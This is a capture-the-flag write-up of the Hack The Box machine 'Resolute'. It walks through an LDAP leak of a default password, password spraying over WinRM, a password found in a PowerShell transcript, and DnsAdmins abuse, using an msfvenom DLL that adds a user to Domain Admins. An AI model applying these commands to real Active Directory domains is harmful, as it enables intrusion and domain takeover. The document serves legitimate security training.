---
layout: single
title: 'Resolute Write-Up: Hack The Box'
excerpt: "Resolute was a straight-forward *medium*-rated machine on Hack The Box created by egre55. Initial recon revealed an open LDAP service which leaked all local users and a default password. This allowed a password spray WinRM and a successful login as user `melanie`. As `melanie`, further machine enumeration revealed PowerShell transcripts that leaked a command containing user `ryan`'s password. User `ryan` is part of the `Contractors` group, which is also contained in the `DnsAdmin` group. Being a member of the `DnsAdmin` is abused to add the first compromised user `melanie` as a `Domain Admin`, owning the machine."
# classes: wide
categories: [hackthebox]
date: 2020-05-30
tags: [hackthebox, dns, hacking, penetration testing, write-ups]
header:
  teaser: \assets\images\htb\resolute\resolute-banner.png
  teaser_home_page: true
toc: true
toc_label: "Table of Contents"
toc_icon: "database"  # corresponding Font Awesome icon name (without fa prefix)
toc_sticky: true
---
![](\assets\images\htb\resolute\resolute-banner.png)
## TL;DR
Resolute was a straight-forward *medium*-rated machine on Hack The Box created by egre55. Initial recon revealed an open LDAP service which leaked all local users and a default password. This allowed a password spray using WinRM and a successful login as user `melanie`. As `melanie`, further machine enumeration revealed PowerShell transcripts that leaked a command containing user `ryan`'s password. User `ryan` is part of the `Contractors` group, which is also contained in the `DnsAdmin` group. Being a member of the `DnsAdmin` is abused to add the first compromised user `melanie` as a `Domain Admin`, owning the machine.

## Nmap Port Scan
`nmap -sCV -Pn -n -p- -T4 -oN nmap/full-resolute 10.10.10.169`
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-26 20:36 EDT
Nmap scan report for 10.10.10.169
Host is up (0.029s latency).                      
Not shown: 65511 closed ports                     
PORT      STATE SERVICE      VERSION              
53/tcp    open  domain?                           
| fingerprint-strings:                            
|   DNSVersionBindReqTCP:                                                                                            
|     version                                     
|_    bind                                        
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-04-27 00:44:46Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn                                                                                                                                                                                
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp   open  kpasswd5?  
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0        
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped                                                                                           
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0                                                                          
|_http-title: Not Found    
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49688/tcp open  msrpc        Microsoft Windows RPC
49712/tcp open  msrpc        Microsoft Windows RPC
65424/tcp open  unknown

Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows
```

## LDAP Enumeration

A default password is shown via the description for user `marko`.
```
Marko Novak, Employees, MegaBank Users, megabank.local                                                             
dn: CN=Marko Novak,OU=Employees,OU=MegaBank Users,DC=megabank,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user 
cn: Marko Novak                                           
sn: Novak 
description: Account created. Password set to Welcome123!
[TRUNCATED]
sAMAccountName: marko
sAMAccountType: 805306368
userPrincipalName: marko@megabank.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local                                            
dSCorePropagationData: 20190927221048.0Z
dSCorePropagationData: 20190927131714.0Z
dSCorePropagationData: 16010101000001.0Z
```

I was unable to get any usage from the `Welcome123!` password and `Marko`, so I created a username list and used Metasploit's WinRM Login module to test the password against the remainder of the accounts.

`ldapsearch -h 10.10.10.169 -x -b "DC=megabank,DC=local" '(objectClass=Person)' | grep userPrincipalName | cut -d " " -f 2 | cut -d "@" -f 1 > users.txt`

We got a hit on user `melanie`.
![](\assets\images\htb\resolute\resolute-winrm-scan.png)

## Machine Compromise

I used evil-WinRM to get a shell and grabbed the user flag.
![](\assets\images\htb\resolute\resolute-melanie-login.png)

Looking at the root directory, we see an interesting folder that is hidden. This leads to an file that leaks the user Ryan's password.

*File Location:*
`C:\PStranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt`

*Line Containing Password Leak:*
```
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
```

## Pivoting to DNS Admin

Using Evil-WinRM I logged in with Ryan and noticed he was part of a `Contractors` group. I love Bloodhound, so I used this opportunity to run it to enumerate everything that's going on in the AD structure.

Ryan was a member of the `Contractors` group, but what is interesting is that `Contractors` are a member of `DnsAdmins` group. Privileges!
![](\assets\images\htb\resolute\resolute-bloodhound.png)

After some research, I followed these blog posts that outline a privilege escalation via a feature abuse in AD where a user who is member of the DNSAdmins group or have write privileges to a DNS server object can load an arbitrary DLL with SYSTEM privileges on the DNS server:
[Abusing DNSAdmins privilege for escalation in Active Directory](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html){:target="_blank"}  
[From DnsAdmins to SYSTEM to Domain Compromise](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise){:target="_blank"} 

In accordance with the blog post, I created a malicous DLL that will add Melanie to the Domain Admins group:  
`msfvenom -a x64 -p windows/x64/exec cmd='net group "domain admins" melanie /add /domain' -f dll -o mel.dll`

![](\assets\images\htb\resolute\resolute-dnscmd-entry.png)

## Domain Admin Escalation

Now we  can log in with Melanie and grab the root flag:
![](\assets\images\htb\resolute\resolute-root.png)

Thanks for reading!